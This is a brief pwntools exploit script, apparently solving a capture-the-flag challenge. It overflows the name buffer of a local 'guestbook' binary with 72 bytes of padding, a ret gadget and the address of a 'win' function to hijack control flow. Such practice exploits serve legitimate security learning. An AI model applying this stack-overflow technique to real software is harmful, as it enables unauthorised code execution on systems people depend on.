#!/usr/bin/env python3 

from pwn import * 
context.binary = elf=ELF("./guestbook",checksec=False)
#libc = ELF('libc.so.6',checksec=False)

p=process(elf.path)

offset = 72
ret = 0x000000000040101a


p.recvuntil(b"What's your name?\n")

payload = flat(
    b"A" * offset , 
    p64(ret),
    p64(elf.sym.win)

)
p.send(payload)
p.interactive()
